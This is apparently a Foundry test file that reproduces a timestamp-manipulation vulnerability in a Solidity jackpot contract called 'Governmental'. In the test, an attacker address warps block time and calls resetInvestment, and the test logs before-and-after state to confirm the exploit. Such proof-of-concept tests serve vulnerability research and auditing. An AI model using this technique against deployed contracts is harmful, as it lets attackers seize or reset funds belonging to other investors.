// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/governmental_survey.sol";

contract TimestampManipulationTest is Test {
    Governmental governmental;
    address owner = address(0x1);
    address alice = address(0x2);
    address attacker = address(0x3);
    uint256 constant ONE_MINUTE = 60;

    function setUp() public {
        // Fund addresses
        vm.deal(owner, 10 ether);
        vm.deal(alice, 10 ether);
        vm.deal(attacker, 10 ether);
        
        // Owner deploys contract with initial ether
        vm.prank(owner);
        governmental = new Governmental{value: 1.5 ether}();
    }

    function testTimestampManipulation() public {
        // Alice makes an investment at time 0
        vm.warp(0);
        vm.prank(alice);
        governmental.invest{value: 1 ether}();

        // Verify state after investment
        assertEq(governmental.lastInvestor(), alice, "Alice should be last investor");
        assertEq(governmental.lastInvestmentTimestamp(), 0, "Timestamp should be set");

        // Attacker attempts to reset too early (should fail)
        vm.warp(ONE_MINUTE - 1);
        vm.prank(attacker);
        vm.expectRevert();
        governmental.resetInvestment();
        
        // Capture state BEFORE critical attack action
        console.log("--- BEFORE-Trigger State ---");
        address lastInvestorBefore = governmental.lastInvestor();
        uint256 jackpotBefore = governmental.jackpot();
        uint256 timestampBefore = governmental.lastInvestmentTimestamp();
        console.log("lastInvestor", lastInvestorBefore);
        console.log("jackpot", jackpotBefore);
        console.log("lastInvestmentTimestamp", timestampBefore);
        
        console.log("--- Trigger: Attacker calls resetInvestment at 60 seconds---");
        // Attacker manipulates timestamp to exactly 60 seconds
        vm.warp(ONE_MINUTE);
        vm.prank(attacker);
        governmental.resetInvestment(); // VULNERABILITY TRIGGER

        // Capture state AFTER critical attack action
        console.log("--- AFTER-Trigger State ---");
        address lastInvestorAfter = governmental.lastInvestor();
        uint256 jackpotAfter = governmental.jackpot();
        uint256 timestampAfter = governmental.lastInvestmentTimestamp();
        console.log("lastInvestor", lastInvestorAfter);
        console.log("jackpot", jackpotAfter);
        console.log("lastInvestmentTimestamp", timestampAfter);
        
        // Differential validation: Compare state changes for vulnerability confirmation
        console.log("--- COMPARISON VERDICT ---");
        bool stateReset = (lastInvestorAfter == address(0)) && 
                         (jackpotAfter == 1 ether) && 
                         (timestampAfter == 0);
        
        if (lastInvestorBefore != lastInvestorAfter) console.log("lastInvestor changed as expected");
        if (jackpotBefore != jackpotAfter) console.log("jackpot changed as expected");
        if (timestampBefore != timestampAfter) console.log("timestamp changed as expected");
        
        // Final vulnerability verdict
        if (stateReset) {
            console.log("RESULT: All key states changed as expected");
            console.log("Vulnerability Exists: Attacker successfully manipulated timestamp to reset contract state");
        } else {
            console.log("RESULT: States did not change as expected");
            console.log("Vulnerability not Exist: Failed to reproduce exploit");
        }

        // Verify contract state reset (original assertions)
        assertEq(lastInvestorAfter, address(0), "Last investor not reset");
        assertEq(jackpotAfter, 1 ether, "Jackpot not reset");
        assertEq(timestampAfter, 0, "Timestamp not reset");
    }
}